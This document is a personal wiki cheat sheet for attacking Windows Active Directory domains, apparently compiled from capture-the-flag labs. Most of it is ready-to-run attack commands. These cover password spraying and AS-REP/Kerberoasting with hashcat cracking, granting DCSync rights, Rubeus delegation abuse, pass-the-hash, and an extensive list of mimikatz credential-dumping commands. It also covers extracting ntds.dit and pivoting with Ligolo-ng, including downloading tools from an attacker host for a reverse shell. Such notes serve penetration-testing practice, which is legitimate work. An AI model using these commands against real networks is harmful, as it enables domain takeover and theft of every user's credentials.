---
layout: wiki
title: Internals - Active Directory Resources
cate1: Internal
cate2: Active Directory
description: Notes about Active Directory
keywords: Internals
---

# Useful Resources
  - **[Wadcoms - Interactive Cheat Sheet for Active Directory](https://wadcoms.github.io/)**
  - **[Active Directory Enumeration Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)**

-----------------------------------------------------------------------

# Initial Access

## Password Spraying
**[Password Spraying via Sprayhound](https://github.com/Hackndo/sprayhound)**
  - Checks badpwdcount attribute only in the domain policy

**Additional Resources**
  - [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
  - [Invoke-CleverSpray](https://github.com/wavestone-cdt/Invoke-CleverSpray)
  - [Spray](https://github.com/Greenwolf/Spray)
  - [Hashcat Wordlists - InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/hash-cracking/#hashcat-install)

## Rid Brute via SMB
**[Rid Brute via SMB](https://medium.com/@e.escalante.jr/active-directory-workshop-brute-forcing-the-domain-server-using-crackmapexec-pt-6-feab1c43d970)**

**Requires:** Guest read access to IPC$ (Remote IPC) SMB File Share 
```
nxc smb 10.10.10.192 -u 'guest' -p '' --rid-brute > sid.txt
cat sid.txt | awk -F': ' '{print $2}' | awk '{print $1}' | sed 's/[DOMAIN]\\//' > users.txt
GetNPUsers.py [DOMAIN]/ -usersfile users.txt -format hashcat
hashcat -m 18200 creds.txt /usr/share/wordlists/rockyou.txt
```

## LDAP Enumeration
**[LDAPSearch Enumeration](https://notes.benheater.com/books/active-directory/page/ldapsearch)**

```
ldapsearch -x -H ldap://BLACKFIELD -s base namingcontexts (Domain Contexts)
ldapsearch -x -H ldap://BLACKFIELD -D 'CN=support,CN=users,DC=BLACKFIELD,DC=local' -W -b 'DC=BLACKFIELD,DC=local' '(objectClass=user)' (Search Users)
ldapsearch -H ldap://192.168.110.55 -x -D "web_svc@painters.htb" -W -b "dc=painters,dc=htb" "(msDS-AllowedToDelegateTo=*)" msDS-AllowedToDelegateTo (Constrained Delegation)
```

**[LDAP Domain Dump via Linux](https://github.com/dirkjanm/ldapdomaindump)**
  - Old tool however useful if Bloodhound.py isn't working as intended.

**Additional resources**
  - [Useful LDAP queries](https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/)

## SMB Enumeration
**[SMB - Share Enumeration](https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html)**
```
nxc smb [IP] --shares
```

**Additional Resources**
  - [BIWasp/NetExec cheat sheet](https://github.com/BlWasp/NetExec-Cheatsheet)
  - [SMB Enumeration cheat sheet](https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html)
  - [CrackMapExec + NetExec cheat sheet](https://github.com/seriotonctf/cme-nxc-cheat-sheet)

## Web Application Vulnerabilities
**[Bad PDF](https://github.com/deepzec/Bad-Pdf)**

**Additional Resources**
  - [Malicious PDF](https://github.com/jonaslejon/malicious-pdf)

## Integrated DNS Dump
[Integrated DNS Dump](https://github.com/dirkjanm/adidnsdump)**

Any user in Active Directory can enumerate all DNS records in the Domain or Forest DNS zones, similar to a zone transfer.

Additional Resources:
  - [ADIDNS Dump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

-----------------------------------------------------------------------

# Domain Enumeration

## Impacket (via Python)
**[Enumeration via Impacket](https://github.com/fortra/impacket)**
  - GetADUsers.py

## Bloodhound
**[BloodHound CE](https://github.com/SpecterOps/BloodHound)**

```
curl -L https://ghst.ly/getbhce | docker compose -f - up
```

**Additional Resources** 
  - [BloodHound Community Edition](https://support.bloodhoundenterprise.io/hc/en-us/articles/17468450058267-Install-BloodHound-Community-Edition-with-Docker-Compose)
  - [BloodHound Cypher Cheatsheet](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)

**[BloodHound.py for Linux](https://github.com/dirkjanm/BloodHound.py)**

**Additional Resources**
  - [BloodHound.py for Bloodhound CE version](https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce)

```
python3 bloodhound.py -u "support" -p "#00^BlackKnight" -c ALL -d BLACKFIELD.local -ns 10.10.10.192 -dc dc01.BLACKFIELD.local
proxychains bloodhound-python -u "web_svc"  -d 'painters.htb' -dc 'dc.painters.htb' --dns-tcp -c ALL -v -ns 192.168.110.55 [proxychains equivalent]
```

-----------------------------------------------------------------------

# Poisoning and Relay
## Responder
**[Responder](https://github.com/lgandx/Responder)**
  - IPv6/IPv4 LLMNR/NBT-NS/mDNS Poisoner and NTLMv1/2 Relay.

```
hashcat -m 5600 --force -a 0 responder.hashes /usr/share/wordlists/rockyou.txt
/opt/tools/Responder/ (location of Responder)
```

## SMB Relay 
**[SMB Relay]**
```
nxc smb [IP] --gen-relay-list relay.txt
```

-----------------------------------------------------------------------

# Local Privilege Escalation

**Resources**
  - [Privilege Escalation Useful Tools](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook?tab=readme-ov-file#useful-tools)
  - [Exploitable Vulnerabilities](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook?tab=readme-ov-file#vulnerabilities)
-----------------------------------------------------------------------

# Domain Privilege Escalation
## ASREPRoasting
**[ASREPRoasting via Impacket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)**

**Targets:** If a domain user account do not require kerberos preauthentication, we can request a valid TGT for this account without even having domain credentials, extract the encrypted blob and bruteforce it offline.

## Kerberoasting
**[Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)**

**Requires:** Domain Credentials

**Targets:** Service Accounts with SPNs registered on the domain to retrieve TGS tickets containing the SPN hashes.

```
GetUserSPNs.py -request active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
GetUserSPNs.py -request 'painters.htb/riley':'P@ssw0rd' -dc-ip 192.168.110.55 -debug -dc-host PAINTERS.HTB
hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force
```

## WriteDACL
**[WriteDACL - BloodHound](https://support.bloodhoundenterprise.io/hc/en-us/articles/17312765477787-WriteDacl)**

## Active Directory ACLs/ACEs
**[Abusing Active Directory ACLs/ACEs](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse)**

## NTLMRelay
**[NTLMRelay](https://www.thehacker.recipes/ad/movement/ntlm/relay)**

## DCSync
**[DCSync - secretsdump](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)**

**With PowerView**:
```
whoami /all
Add-ADGroupMember -Identity "Exchange Windows Permissions" -members svc-alfresco
net group "Exchange Windows Permissions" /add svc-alfresco
Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync
Add-ObjectACL -PrincipalIdentity test123 -Credential $cred -Rights DCSync
Get-DomainUser -Identity svc-alfresco
Get-ObjectAcl -DistinguishedName "DC=htb,DC=local" -ResolveGUIDs | Where-Object { $_.IdentityReference -match "svc-alfresco" }
```

## SYSVOL Group Policy Credential Mining
**[SYSVOL Group Policy Credential Mining](https://adsecurity.org/?p=2288)**

## Constrained Delegation
**[Constrained Delegation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/constrained-delegation)**

```
Rubeus.exe dump /luci:0x599ac7 /service:CIFS/dc.painters.htb /nowrap /outfile [dump to kirbi files]
Rubeus.exe asktgt /user:blake /password:Password123! /domain:PAINTERS.HTB /dc:192.168.110.55 [request for TGT using credentials]
Rubeus.exe ptt /ticket:test.kirbi (import ticket)
Rubeus.exe tgtdeleg /user:blake /password:Password123! /domain:PAINTERS.HTB /target:CIFS/dc.painters.htb /nowrap (ticket delegation with TGT to obtain TGS of target service)
Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dc.painters.htb" /user:blake /ticket:test.kirbi /nowrap (Access to CIFS/dc.painters.htb)


**For Linux use:**
base64 -d ticket.kirbi.b64 > ticket.kirbi
ticketConverter.py cifs.kirbi cifs.ccache
export KRB5CCNAME=cifs.ccache
sudo apt-get install krb5-user

OR

getST.py -spn "cifs/dc.painters.htb" -impersonate "administrator" "painters/blake:Password123\!" -dc-ip 192.168.110.55
```

**What if we have delegation rights for only a spesific SPN? (e.g TIME):**

In this case we can still abuse a feature of kerberos called "alternative service". This allows us to request TGS tickets for other "alternative" services and not only for the one we have rights for. Thats gives us the leverage to request valid tickets for any service we want that the host supports, giving us full access over the target machine.

**Additional Resources**
  - [Using altservice to generate LDAP TGS](https://medium.com/r3d-buck3t/attacking-kerberos-constrained-delegations-4a0eddc5bb13#3276)

## ForceChangePassword
**[ForceChangePassword](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword)**

**Requires:** `GenericAll`, `AllExtendedRights` or `User-Force-Change-Password` on Object

```
net rpc password AUDIT2020 -U BLACKFIELD\\support -S BLACKFIELD.local (prompts new password)

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('CONTOSO\\dfm.a', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred (optional $Cred)
```

**Additional Resources**
  - [BloodHound ForceChangePassword](https://support.bloodhoundenterprise.io/hc/en-us/articles/17223286750747-ForceChangePassword)

## Pass The Hash
**[Pass The Hash](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/hash-pass-the-hash/#references)**
```
evil-winrm -u James -H 8af1903d3c80d3552a84b6ba296db2ea -i 192.168.110.53 (obtain through mimikatz dump)
  - Sometimes you can compromise the WinRM, and then create a new administrator account to psexec into to access domain.
```

## SeDebugPrivilege Add New Administrative User
**[SeDebugPrivilege Add New Administrative User](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)**

## Credential Dumping
**[LSASS Dump - lsass.DMP](https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf)**

**Requires:** Credential Guard to be disabled.

```
Dumping LSASS via Linux: https://medium.com/@offsecdeer/dumping-lsass-remotely-from-linux-efc47391e56d
```

**[Dumping Local SAM](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-hashes-from-sam-registry)**
  - Crack SAM hashes: https://sanjumalhotra26.medium.com/dumping-credentials-from-sam-file-using-mimikatz-and-cracking-with-john-the-ripper-and-hashcat-ce5bbf2f4f5a

**[Pypykatz - Mimikatz for Linux](https://github.com/skelsec/pypykatz)**

**Requires:** A DMP file containing credentials extracted to our Linux machine.
```
pypykatz lsa minidump lsass.DMP
```

## Abusing Backup Operators Group

**Requires:** User account that is member of the Backup Operators group
**Achieves:** Extract ntds.dit, dump hashes to escalate privileges to Domain Admin

**[Backup Operator - Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators)**

```
whoami /all (SeBackupPrivilege Enabled)

diskshadow /s backup.txt
robocopy /b E:\Windows\ntds . ntds.dit (NTDS file)
reg save hklm\system c:\temp\system.bak (System Hive keys)
```
**Additional Resources**
  -  [Windows Privilege Escalation with SeBackupPrivilege](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960#ac58)

## Shadow Credentials (msDS-KeyCredentialLink | AddKeyCredentialLink)

### Understanding PKINIT (Public Key Cryptography for Initial Authentication)
*Credits to SpecterOps [link here](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)*

In Kerberos authentication, clients must perform "pre-authentication" before the KDC provides them with a Ticket Granting Ticket (TGT), which can subsequently be used to obtain Service Tickets. The reason for pre-authentication is that without it, anyone could obtain a blob encrypted with a key derived from the client’s password and try to crack it offline, as done in the AS-REP Roasting Attack.

The client performs pre-authentication by encrypting a timestamp with their credentials to prove to the KDC that they have the credentials for the account. This is usually done via a symmetric key approach, derived from the client’s password, AKA secret key. If using RC4 encryption, this key would be the NT hash of the client’s password. The KDC has a copy of the client’s secret key and can decrypt the pre-authentication data to authenticate the client. The KDC uses the same key to encrypt a session key sent to the client along with the TGT.

PKINIT is the less common, asymmetric key (public key) approach. The client has a public-private key pair, and encrypts the pre-authentication data with their private key, and the KDC decrypts it with the client’s public key. This requires an exchange of certificates using a Certificate Authority which they both trust, through a method known as the Certificate Trust model.

A new concept introduced in Windows Server 2016 allowed for Key Trusts that support passwordless authentication. The client’s public key is stored in a multi-value attribute called `msDS-KeyCredentialLink`. The values of this attribute are Key Credentials, which are serialized objects containing information such as the creation date, the distinguished name of the owner, a GUID that represents a Device ID, and, of course, the public key.

![image](https://github.com/qwutony/qwutony.github.io/assets/45024645/02de8c83-70fc-4ae3-a294-fcee6b2d22e6)

### Windows Hello Enrollment

When a user enrolls, the TPM (Trusted Platform Module) generates a public-private key pair for the user’s account — the private key should never leave the TPM. Next, if the Certificate Trust model is implemented in the organization, the client issues a certificate request to obtain a trusted certificate from the environment’s certificate issuing authority for the TPM-generated key pair. 

![image](https://github.com/qwutony/qwutony.github.io/assets/45024645/69e08f9d-f2ba-45f8-84e8-805d6b85052d)

However, if the Key Trust model is implemented, the public key is stored in a new Key Credential object in the msDS-KeyCredentialLink attribute of the account. The private key is protected by a PIN code, which Windows Hello allows replacing with a biometric authentication factor, such as fingerprint or face recognition.

### msDS-KeyCredentialLink
In essence, the `msDS-KeyCredentialLink` attribute is part of the implementation for Windows Hello for Business and other key-based authentication mechanisms in Active Directory (AD). It is used to store public key credentials for an Active Directory object, typically a user or a device. This attribute enables passwordless authentication methods, such as biometrics (e.g., fingerprint or facial recognition) and PINs, by linking them to the user or device's AD account.

This means that if you can write to the msDS-KeyCredentialLink property of a user, you can obtain a TGT for that user. If there is a relationship between Domain Users or Computer accounts that allow `AddKeyCredentialLink`, it may be possible to takeover that user or object. It is also possible to obtain the NTLM hash of the user

### Shadow Credentials
When abusing Key Trust, we are effectively adding alternative credentials to the account, or “Shadow Credentials”, allowing for obtaining a TGT and subsequently the NTLM hash for the user/computer. Those Shadow Credentials would persist even if the user/computer changed their password.

### Exploitation
Use [pywhisker for Linux](https://github.com/ShutdownRepo/pywhisker) or [Whisker for Windows](https://github.com/eladshamir/Whisker) to abuse.

Can use `add` to generate a new public|private key pair and add it to the `msDS-KeyCredentialLink` property. Also keep in mind that it might be useful to use the `remove` for cleanup.

```
python3 pywhisker.py -d "zsm.local" -u "marcus" -p "\!QAZ2wsx" -t "ZPH-SVRMGMT1$" --action "add" -v 
```

**Additional Resources**
  - [Shadow Credentials - Computer Account Take Over](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials#computer-account-take-over)
  - [SpectreOps - Shadow Credentials Abusing Key Trust Account Mapping for Takeover](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
  - [The Hacker Recipes - ACE Abuse](https://www.thehacker.recipes/active-directory-domain-services/movement/access-control-entries)
  - [The Hacker Recipes - Shadow Credentials](https://www.thehacker.recipes/active-directory-domain-services/movement/access-control-entries/shadow-credentials)

-----------------------------------------------------------------------

# Lateral Movement

## Smbexec
**[Smbexec](https://book.hacktricks.xyz/windows-hardening/lateral-movement/smbexec)**

## WinRM 
**[Evil-WinRM - ultimate WinRM shell for hacking/pentesting](https://github.com/Hackplayers/evil-winrm)**

```
gem install evil-winrm
evil-winrm -i <IP> -u <username> -p <password>
evil-winrm -i <IP> -u <username> -H <ntlm hash>
evil-winrm -i <IP> -u <username> -k

## Run Powershell Commands
whoami
ipconfig
Get-Process

## Upload and Download Files
upload /local/path/to/file /remote/path
download /remote/path/to/file /local/path

## Run Powershell Scripts
upload /local/path/to/script.ps1 /remote/path/script.ps1
powershell -File /remote/path/script.ps1
```

## Mimikatz
**[Mimikatz](https://github.com/gentilkiwi/mimikatz/releases)**

```
#Dump LSASS:
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords

#(Over) Pass The Hash
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>

#List all available kerberos tickets in memory
mimikatz sekurlsa::tickets

#Dump local Terminal Services credentials
mimikatz sekurlsa::tspkg

#Dump and save LSASS in a file
mimikatz sekurlsa::minidump c:\temp\lsass.dmp

#List cached MasterKeys
mimikatz sekurlsa::dpapi

#List local Kerberos AES Keys
mimikatz sekurlsa::ekeys

#Dump SAM Database
mimikatz lsadump::sam

#Dump SECRETS Database
mimikatz lsadump::secrets

#Inject and dump the Domain Controler's Credentials
mimikatz privilege::debug
mimikatz token::elevate
mimikatz lsadump::lsa /inject

#Dump the Domain's Credentials without touching DC's LSASS and also remotely
mimikatz lsadump::dcsync /domain:<DomainFQDN> /all

#Dump old passwords and NTLM hashes of a user
mimikatz lsadump::dcsync /user:<DomainFQDN>\<user> /history

#List and Dump local kerberos credentials
mimikatz kerberos::list /dump

#Pass The Ticket
mimikatz kerberos::ptt <PathToKirbiFile>

#List TS/RDP sessions
mimikatz ts::sessions

#List Vault credentials
mimikatz vault::list
```

**Additional Resources**
  - [Mimikatz Post Exploitation Basics](https://infosecwriteups.com/post-exploitation-basics-in-active-directory-enviorment-by-hashar-mujahid-d46880974f87)
  - [Mimikatz Guide Reference](https://adsecurity.org/?page_id=1821)

## Network Pivoting via Ligolo-ng
**[Network Pivoting - Ligolo-ng](https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740)**

```
./agent -connect 10.10.14.5:443 -ignore-cert
sudo ./proxy -selfcert -laddr 0.0.0.0:443 -v
session
start
sudo ip route add 192.168.110.0/24 dev ligolo

listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444 (open port on DMZ machine for reverse shell)

powershell -Command "Invoke-WebRequest -Uri 'http://192.168.110.51:1235/Rubeus.exe' -OutFile 'Rubeus.exe'"
```

**Additional Resources**
  - [Ligolo Guide for pivoting](https://systemweakness.com/pivoting-for-newbies-with-ligolo-ng-82f13040aa39)
  - [Advanced pivoting guide](https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5)

-----------------------------------------------------------------------

# Exfiltration (Domain Controller)

## Extraction of ntds.dit
**[ntdsutil](https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds#a-d-maintenance-ntdsutil)**
**[VSSAdmin](https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds#volume-shadow-copy-vssadmin)**

## Exploitation of Monitoring Systems
**[Exploitation of Monitoring Systems](https://github.com/HD421/Monitoring-Systems-Cheat-Sheet)**

  - [Zabbix Agent](https://medium.com/@ferspider3/enabling-zabbix-agent-windows-to-accept-remote-commands-2597c40259b6)
    - Scripts in Zabbix can be used to perform custom monitoring checks, collect and process data from external sources, and automate tasks based on monitoring events.
  - [Zabbix SSO bypass](https://github.com/Mr-xn/cve-2022-23131)

-----------------------------------------------------------------------

# Active Directory Tools
**[NetExec](https://github.com/Pennyw0rth/NetExec)**
```
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh (install Rust)
source $HOME/.cargo/env
pipx install git+https://github.com/Pennyw0rth/NetExec
```

**[PowerView (Deprecated since 2021)](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)**
```
. .\powerview.ps1
Import-Module C:\Temp\PowerView.ps1
```

**NSE**
```--script smb-os-discovery,smb-enum-shares,smb-enum-users,smb-vuln*```

**SMB**
Enum4Linux
SMBMap
smbclient
smbclient.py (Impacket)
**[NetExec - Cheatsheet](https://github.com/BlWasp/NetExec-Cheatsheet)**
**[SMB Enumeration Cheatsheet](https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html)**

**[Impacket]()**
```
python3 -m pipx install impacket
  - **PSExec**
    - Shell access via SMB shares (Pass the Hash) 
  - **GetNPUsers**
    - Kerberos Pre-authentication disabled (ASREPRoasting)

smbclient.py -k -no-pass PAINTERS.HTB/Administrator@dc.painters.htb -debug
wmiexec.py -k -no-pass PAINTERS.HTB/Administrator@dc.painters.htb
psexec.py -k -no-pass Administrator@dc.painters.htb -dc-ip 192.168.110.55 -debug (sometimes don't need the domain)
smbexec.py administrator@dc.painters.htb -k -no-pass -debug
  - [smbexec](https://book.hacktricks.xyz/windows-hardening/lateral-movement/smbexec)
```

**[Rubeus for Windows](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)**

**[Pywerview - Linux AD Enumeration](https://github.com/the-useless-one/pywerview)**

**[Empire - Post-exploitation Framework](https://github.com/BC-SECURITY/Empire)**


## Resources
 - [The Hacker Recipes](https://www.thehacker.recipes/)
 - [DSInternals](https://github.com/MichaelGrafnetter/DSInternals)
 - [Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
 - [InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/)
